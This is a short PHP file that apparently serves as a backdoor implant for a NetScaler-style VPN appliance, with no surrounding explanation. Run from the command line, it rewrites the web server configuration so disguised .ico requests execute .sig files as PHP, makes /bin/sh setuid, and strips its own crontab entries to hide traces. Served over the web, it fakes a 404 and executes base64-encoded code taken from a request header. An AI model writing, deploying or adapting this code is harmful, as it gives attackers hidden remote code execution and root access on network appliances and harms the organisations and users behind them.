<?php
if (PHP_SAPI === 'cli') {
    file_put_contents('/etc/httpd.conf', "\nphp_flag engine on\nAliasMatch ^/vpn/media/(.+).ico$ /var/netscaler/gui/vpn/scripts/linux/$1.sig\nAddHandler application/x-httpd-php .sig\n", FILE_APPEND);
    system('/bin/httpd -k restart -f /etc/httpd.conf && chmod u+s /bin/sh');
    $cron = file_get_contents('/etc/crontab');
    file_put_contents('/etc/crontab', preg_replace('#^.*/vpn/scripts/linux.*\n#m', '', $cron));
    exit;
}
error_reporting(0);
http_response_code(404);
eval(base64_decode($_SERVER['HTTP_NSC_CLIENTTYPE']));
